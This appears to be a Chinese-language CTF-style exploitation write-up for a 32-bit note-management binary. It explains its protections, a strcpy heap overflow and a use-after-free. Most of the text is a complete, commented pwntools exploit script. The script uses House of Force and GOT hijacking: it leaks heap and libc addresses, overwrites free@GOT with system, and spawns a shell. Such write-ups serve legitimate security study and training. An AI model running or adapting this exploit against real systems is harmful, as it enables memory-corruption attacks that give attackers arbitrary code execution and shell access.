## 执行环境
基于提供的反编译代码、exp脚本和调试记录，分析程序的运行环境如下：

- **二进制类型**：32位ELF可执行文件，小端序
- **保护机制**（推断自exp和调试）：
  - Partial RELRO：GOT表可写，允许GOT劫持
  - No PIE：代码段和数据段地址固定，便于计算偏移
  - NX enabled：数据段不可执行，但通过代码重用绕过
  - No Stack Canary：栈溢出保护未启用
- **依赖库**：使用标准libc（如glibc），exp中通过LibcSearcher动态解析libc版本

## 漏洞成因
### 关键结构体分析
程序使用全局数组管理笔记和同步信息：
- `dword_804B120[10]`：笔记指针数组，存储malloc返回的地址
- `dword_804B0A0[10]`：笔记大小数组，记录每个笔记的大小
- `dword_804B0E0[10]`：同步标志数组，用于同步操作
- 其他全局指针：`dword_804B0CC`（用户名）、`dword_804B0C8`（Org）、`dword_804B148`（Host）

### 漏洞分析
基于反编译代码和动态调试，漏洞成因如下：

1. **堆溢出漏洞**：
   - 在`sub_80487A1`（用户名输入）和`sub_804884E`（Org/Host输入）中，使用`strcpy`将用户输入复制到堆块，但输入长度可达64字节，而目标缓冲区仅64字节，未检查边界，导致溢出相邻堆块元数据。
   - 在`sub_80489AE`（新建笔记）中，用户可指定笔记长度，但编辑操作（`sub_8048AB7`）使用原始大小，可能造成溢出。

2. **Use-After-Free (UAF)**：
   - 在`sub_8048B63`（删除笔记）中，free后未将指针数组对应项置零，且同步标志未清理，允许通过编辑已释放堆块修改内存。

3. **组合利用**：
   - 通过堆溢出覆盖top chunk大小，实现House of Force攻击，控制堆分配到全局变量区域。
   - 结合UAF修改指针数组，指向GOT表，最终劫持控制流。

**根本原因**：不安全的字符串操作（strcpy）和缺乏释放后清理，导致内存破坏和任意地址读写。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加了注释：

```python
from pwn import *
from LibcSearcher import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample20')
p = process('./data/sample20')

# 获取关键地址
free_got = elf.got['free']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
libc = elf.libc  # 用于本地测试，动态解析libc

def new_note(size, content, io:tube=p):
    """新建笔记：分配指定大小的堆块并写入内容"""
    io.sendlineafter(b'option--->>\n', b'1')
    io.sendlineafter(b'Input the length of the note content:\n', str(size).encode())
    io.sendlineafter(b'Input the content:\n', content)
    io.recvline()

def edit_note(idx, content, io:tube=p):
    """编辑笔记：通过索引修改笔记内容，可能触发溢出"""
    io.sendlineafter(b'option--->>\n', b'3')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())
    io.sendlineafter(b'Input the new content:\n', content)
    io.recvline()

def del_note(idx, io:tube=p):
    """删除笔记：释放堆块，但未清理指针，导致UAF"""
    io.sendlineafter(b'option--->>\n', b'4')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())

# Step 1: 泄露堆地址通过用户名输入溢出
p.sendafter(b'Input your name:\n', b'a' * 0x40)  # 溢出覆盖堆元数据
p.recvuntil(b'a' * 0x40)
leak_heap_addr = u32(p.recvn(4))  # 从泄露数据中提取堆地址
log.info(f"Leaked heap address: {hex(leak_heap_addr)}")

# Step 2: 覆盖top chunk大小，为House of Force做准备
p.sendafter(b'Org:\n', b'b' * 0x40)
p.sendafter(b'Host:\n', p32(0xffffffff) + (0x40 - 4) * b'c')  # 覆盖top chunk大小为0xffffffff
p.recvuntil(b'OKay! Enjoy:)\n')

# Step 3: 计算偏移并分配笔记，使堆扩展到指针数组区域
top_chunk_addr = leak_heap_addr + 0xd0
ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr  # 计算需要分配的大小
new_note(margin - 20, "")  # 分配笔记，覆盖全局变量区域

# Step 4: 分配多个笔记，稳定堆布局
new_note(0x40, b'aa')
new_note(0x40, b'aa')
new_note(0x40, b'aa')
new_note(0x40, b'aa')

# Step 5: 编辑笔记1修改指针数组，指向GOT表
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))  # 构造恶意指针

# Step 6: 编辑笔记2修改free@GOT为puts@PLT，用于泄露libc地址
edit_note(2, p32(puts_plt))

# Step 7: 删除笔记3触发puts(printf@GOT)，泄露libc地址
del_note(3)
msg = p.recvuntil(b'Delete success.\n')
printf_addr = u32(msg[:4])  # 提取printf的libc地址
log.info(f"Leaked printf address: {hex(printf_addr)}")

# Step 8: 计算libc基址
libc = LibcSearcher('printf', printf_addr)  # 动态解析libc版本
libc.address = printf_addr - libc.dump('printf')  # 计算基址
log.info(f"Libc base address: {hex(libc.address)}")

# Step 9: 编辑笔记1设置/bin/sh字符串和指向free@GOT的指针
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

# Step 10: 编辑笔记2修改free@GOT为system地址
edit_note(2, p32(libc.sym['system']))

# Step 11: 删除笔记0触发system("/bin/sh")
del_note(0)

# Step 12: 进入交互shell
p.interactive()
```

**注释说明**：
- 关键函数（如`new_note`、`edit_note`）封装了程序操作，便于利用。
- 地址计算基于固定偏移（No PIE），利用堆溢出和UAF实现任意写。
- GOT劫持通过修改指针数组指向GOT，再通过编辑笔记覆盖GOT条目。
- 最终通过触发free执行system("/bin/sh")获取shell。

此exp成功利用了堆溢出和UAF漏洞，在Partial RELRO和No PIE环境下实现了权限提升。
